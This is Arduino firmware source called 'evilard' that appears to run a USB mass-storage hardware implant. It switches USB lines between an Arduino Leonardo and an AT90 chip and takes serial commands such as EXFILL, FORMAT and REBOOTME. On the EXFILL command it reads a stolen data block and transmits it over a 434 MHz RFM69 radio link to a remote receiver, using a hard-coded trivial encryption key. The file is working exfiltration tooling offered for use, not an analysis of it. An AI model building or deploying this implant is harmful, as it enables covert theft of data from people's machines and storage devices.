/*
** MIT LICENSE
** Copyright <2020> <David Reguera Garcia aka Dreg> dreg@fr33project.org
** http://www.fr33project.org - https://github.com/David-Reguera-Garcia-Dreg
**
** Permission is hereby granted, free of charge, to any person obtaining a copy of this software and
** associated documentation files (the "Software"), to deal in the Software without restriction,
** including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense,
** and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so,
** subject to the following conditions:
**
** The above copyright notice and this permission notice shall be included in all copies or substantial
** portions of the Software.
**
** THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT
** LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
** IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,
** WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
** SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
*/

#define COMSRC // ONLY DEFINE THIS ONE TIME IN THE FULL PROJECT, THE OTHERS MUST BE USED ONLY: #include <comsrc.h>
#include "comsrc\comsrc.h"

#include <SPI.h>
#include <RH_RF69.h>
#include <AltSoftSerial.h>
#include <avr/io.h>

#define clear_bit(sfr, bit) (_SFR_BYTE(sfr) &= ~_BV(bit))
#define set_bit(sfr, bit) (_SFR_BYTE(sfr) |= _BV(bit))
#define toogle_bit(sfr, bit) (_SFR_BYTE(sfr) ^= _BV(bit))

#define LED1 8
#define LED2 9

#define USER_BUTTON 12


void initVariant(void) 
{
  //modified by Dreg
  asm volatile ("sbi 0x10,0");
  asm volatile ("cbi 0x11,0");
  asm volatile ("sbi 0x10,1");
  asm volatile ("sbi 0x11,1");
  // -
  delay(2000);
}

AltSoftSerial altSerial;

uint8_t gj_index;
unsigned char gj[sizeof(EXFL_BLK_t)];

/*
  Arduino leonardo -> RFM69HCW adafruit
    VIN -> 5V
    GND -> GND
    G0 -> 3
    SCK -> ICSP SCK
    MISO -> ICSP MISO
    MOSI -> ICSP MOSI
    CS -> 7
    RST -> 4
*/

#define RF69_FREQ 434.0

#define RFM69_INT     3
#define RFM69_CS      7 
#define RFM69_RST     4  

RH_RF69 rf69(RFM69_CS, RFM69_INT);

uint32_t packetnum = 0;  // packet counter, we increment per xmission

bool connected_packet = false;

void send_rf() 
{   
  pinMode(RFM69_RST, OUTPUT);
  digitalWrite(RFM69_RST, LOW);

  altSerial.println("\r\n\r\nRFM69 TX");
  altSerial.println();

  // manual reset
  digitalWrite(RFM69_RST, HIGH);
  delay(10);
  digitalWrite(RFM69_RST, LOW);
  delay(10);
  
  if (!rf69.init()) {
    altSerial.println("RFM69 radio init failed");
    while (1);
  }
  altSerial.println("RFM69 radio init OK!");
  // Defaults after init are 434.0MHz, modulation GFSK_Rb250Fd250, +13dbM (for low power module)
  // No encryption
  if (!rf69.setFrequency(RF69_FREQ)) {
    altSerial.println("setFrequency failed");
  }

  // If you are using a high power RF69 eg RFM69HW, you *must* set a Tx power with the
  // ishighpowermodule flag set like this:
  rf69.setTxPower(20, true);  // range from 14-20 for power, 2nd arg must be true for 69HCW

  // The encryption key has to be the same as the one in the server
  uint8_t key[] = { 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
                    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08};
  rf69.setEncryptionKey(key);
  
  altSerial.print("RFM69 radio @");  altSerial.print((int)RF69_FREQ);  altSerial.println(" MHz");

  for (int h = 0; h < 3; h++)
  {
    delay(1000);  // Wait 1 second between transmits, could also 'sleep' here!
    uint8_t len_to_send =  sizeof(gj);
    if (connected_packet)
    {
      altSerial.print("\r\nsending ping to RF....\r\n");
      len_to_send = 3;
    }
    else
    {
      altSerial.print("Sending packet size: ");
      altSerial.println(sizeof(gj)); 
    }
    
    // Send a message!
    rf69.send((uint8_t *)gj, len_to_send);
    rf69.waitPacketSent();
  
    // Now wait for a reply
    uint8_t buf[RH_RF69_MAX_MESSAGE_LEN] = { 0 };
    uint8_t len = sizeof(buf);
  
    if (rf69.waitAvailableTimeout(500))  { 
      // Should be a reply message for us now   
      if (rf69.recv(buf, &len)) {
        altSerial.print("\r\nPacket nr: ");
        altSerial.print(packetnum++);
        altSerial.print("\r\nGot a reply: ");
        altSerial.println((char*)buf);
        if (connected_packet)
        {
          connected_packet = false;
          packetnum = 0;
        }
        return;
      } else {
        altSerial.println("Receive failed");
      }
    } else {
      altSerial.println("No reply, is another RFM69 listening?");
    }
  }
}



void Blink(byte PIN, byte DELAY_MS, byte loops) {
  for (byte i=0; i<loops; i++)  {
    digitalWrite(PIN,HIGH);
    delay(DELAY_MS);
    digitalWrite(PIN,LOW);
    delay(DELAY_MS);
  }
}

void switch_usb_to_leo(void)
{  
  altSerial.println("\r\nswitching to leo...\r\n");
  delay(4000);

  Serial1.flush();
  Serial1.end();
  clear_bit(DDRD, DDD3);
  
  initVariant();

  delay(500);
  clear_bit(DDRD, DDD7);
}

void switch_usb_to_at90(void)
{  
  altSerial.println("\r\nswitching to at90...\r\n");
  delay(4000);

  delay(500);
  clear_bit(PORTF, PF1);
  delay(500);
  set_bit(DDRF, DDF0);
  delay(500);
  set_bit(PORTF, PF0);
  delay(500);
  set_bit(DDRF, DDF1);
  delay(500);
  set_bit(PORTF, PF1);
  delay(500);

  delay(500);
  set_bit(DDRD, DDD7);
  delay(500);
  clear_bit(PORTD, PD7);

  Serial1.begin(9600);
  
}


void Reboot(void)
{
  delay(500);
  altSerial.println("\r\nrebooting...\r\n");
  switch_usb_to_leo();
  switch_usb_to_at90();
}

void setup() 
{
  initVariant();

  altSerial.begin(9600);
  
  altSerial.println("\r\n-\r\n"
  "evilard (MIT LICENSE) by David Reguera Garcia aka Dreg - dreg@fr33project.org\r\n"
  "http://www.fr33project.org - https://github.com/David-Reguera-Garcia-Dreg\r\n"
  "-\r\n");

  altSerial.println("waiting a few secs to start....\r\n");
  

  delay(3000);

  switch_usb_to_at90();
}

void phys_reboot_mass_storage(void)
{
  Reboot();
}

bool is_stage_2 = false;

#define MY_ECO() while (Serial1.available() <= 0); \
    byte_readed = Serial1.read();  \
    altSerial.write(byte_readed);  \



#define MY_ECO_HEX() while (Serial1.available() <= 0); \
    gj[gj_index] = Serial1.read();  \
    { \
    char buf[4] = { 0 }; \
    sprintf(buf,"%02X ",gj[gj_index]); \
    altSerial.print(buf); \
    gj_index++; \
    }

void loop()
{
  char byte_readed;
  int i;

  loopez:
  MY_ECO();
  if ('\n' == byte_readed) goto loopez;
  if ('+' == byte_readed)
  {
    MY_ECO();
    if ('\n' == byte_readed) goto loopez;
    if ('.' == byte_readed)
    {
      MY_ECO();
      if ('\n' == byte_readed) goto loopez;
      if ('-' == byte_readed)
      {
        MY_ECO();
        if ('\n' == byte_readed) goto loopez;
        
        switch(byte_readed)
        {
          case '2':
            altSerial.println("\r\nPRLE_CMD_I_AM_IN_STAGE2 recved\r\n");
            is_stage_2 = true;
          break;

          case 'R':
            altSerial.println("\r\nPRLE_CMD_REBOOTME recved\r\n");
            altSerial.println("rebooting mass storage....");
            phys_reboot_mass_storage();
          break;

          case 'F':
            altSerial.println("\r\nPRLE_CMD_FORMAT recved\r\n");
            is_stage_2 = false;
          break;

          case 'P':
            altSerial.println("\r\nPRLE_CMD_GETRSTPKT recved\r\n");
            Serial1.write(packetnum);
            packetnum = 0;
          break;

          case 'E':
            altSerial.println("\r\nPRLE_CMD_EXFILL recved\r\n");
            MY_ECO();
            MY_ECO();
            gj_index = 0;
            for (i = 0; i < sizeof(EXFL_BLK_t); i++)
            {
              MY_ECO_HEX();
            }
            altSerial.println("\r\n");
            send_rf();
          break;

          case 'A':
            altSerial.println("\r\nPRLE_CMD_AM_I_IN_STAGE2 recved\r\n");
            if (is_stage_2)
            {
              Serial1.print(PRLE_CMD_OK);
              Serial1.print("\r\n");
              Serial1.flush();
            }
            else
            {
              connected_packet = true;
              packetnum = 0; 
              send_rf();
              packetnum = 0; 
              connected_packet = false;
              Serial1.println(PRLE_CMD_NOK); 
              Serial1.print("\r\n");
              Serial1.flush();
            }
          break;

          default:
            goto loopez;
          break;
        }
      }
    }
  }
}
